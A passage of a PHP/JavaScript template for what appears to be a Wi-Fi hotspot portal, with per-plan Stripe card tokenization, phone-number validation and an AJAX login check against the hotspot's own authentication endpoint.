    		$('#payment-errors-<?php echo $plan->id; ?>').text('All fields required');
    		return;
    	}

        var form = $('#stripe_form-<?php echo $plan->id; ?>');
    $('#sbtn-<?php echo $plan->id; ?>').prop('disabled', true);
    Stripe.createToken({
       /* Card Details */
       number: $('#cc_number_<?php echo $plan->id; ?>').val(),
       cvc: $('#cvv_<?php echo $plan->id; ?>').val(),
       exp_month: $('#ex_month_<?php echo $plan->id; ?>').val(),
       exp_year: $('#ex_year_<?php echo $plan->id; ?>').val(),
       }, stripeResponseHandler_<?php echo $plan->id; ?>);
    return false;
    }
    var stripeResponseHandler_<?php echo $plan->id; ?> = function(status, response) {
    var form = $('#stripe_form-<?php echo $plan->id; ?>');
    if (response.error) {
        $('#payment-errors-<?php echo $plan->id; ?>').text(response.error.message);
        $('#sbtn-<?php echo $plan->id; ?>').prop('disabled', false);
    } else {
         $('<input />').attr('type', 'hidden')
          .attr('name', "stripeToken")
          .attr('value', response.id)
          .appendTo('#token_<?php echo $plan->id; ?>');
          $('<input />').attr('type', 'submit')
          .attr('id', 'sub_sbtn-<?php echo $plan->id; ?>')
          .appendTo('#subdiv_<?php echo $plan->id; ?>');
          $("#phoneint-<?php echo $plan->id; ?>").val($("#phone-<?php echo $plan->id; ?>").intlTelInput("getNumber"));
          $("#sub_sbtn-<?php echo $plan->id; ?>").click();
    }
};



            $("#phone-<?php echo $plan->id; ?>").intlTelInput({
            initialCountry: "tr",
            nationalMode: false,
            geoIpLookup: function(callback) {
                $.get('http://ipinfo.io', function() {}, "jsonp").always(function(resp) {
                    var countryCode = (resp && resp.country) ? resp.country : "";
                    callback(countryCode);
                });
            },
            utilsScript: "assets/app/js/utils.js" // just for  formatting/placeholders etc
        });
                $("#phone-<?php echo $plan->id; ?>").keyup(function(){
                if ($("#phone-<?php echo $plan->id; ?>").intlTelInput("isValidNumber")) {
                    $("#phone_error-<?php echo $plan->id; ?>").empty();
                    $("#phone_error-<?php echo $plan->id; ?>").html('✓ Valid Number');
                    $("#sbtn-<?php echo $plan->id; ?>").prop('disabled', false);
              } else {
                $("#phone_error-<?php echo $plan->id; ?>").empty();
                    $("#phone_error-<?php echo $plan->id; ?>").html('Invalid Number');
                    $("#sbtn-<?php echo $plan->id; ?>").prop('disabled', true);
              }
            });

<?php endforeach ?>

$(document).ready(function() {
    $(".onlynumbers").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
             // Allow: Ctrl+A
            (e.keyCode == 65 && e.ctrlKey === true) ||
             // Allow: Ctrl+C
            (e.keyCode == 67 && e.ctrlKey === true) ||
             // Allow: Ctrl+X
            (e.keyCode == 88 && e.ctrlKey === true) ||
             // Allow: home, end, left, right
            (e.keyCode >= 35 && e.keyCode <= 39)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });
});
</script>
<script type="text/javascript">
    $("#loggin").click(function() {
    var username = $("#auth_user").val();
    var password = $("#auth_pass").val();
    var nasid = $("#nasid").val();
    var dataString = 'username='+ username + '&password='+ password + '&nasid='+ nasid;
    if(username==''||password==''||nasid=='')
    {
    }
    else {
        $("#loggin").prop('disabled', true);
        $.ajax({
            type: "POST",
            url: "https://hotspot.linefi.net/hauth/ajaxvalidate",
            data: dataString,
            cache: false,
            success: function(result){
                if(result == 'Fail') {
                    $("#log_error").empty();
                    $("#log_error").html('Invalid Credentials');
                    $("#loggin").prop('disabled', false);
                }
                else {
                    $("#smslogin_form").submit();
                }
            }
        });
    }
});
$("#auth_user").keydown(function(){
    $("#log_error").empty();
    });
$("#auth_pass").keydown(function(){
    $("#log_error").empty();
    });

</script>

</body>
</html>
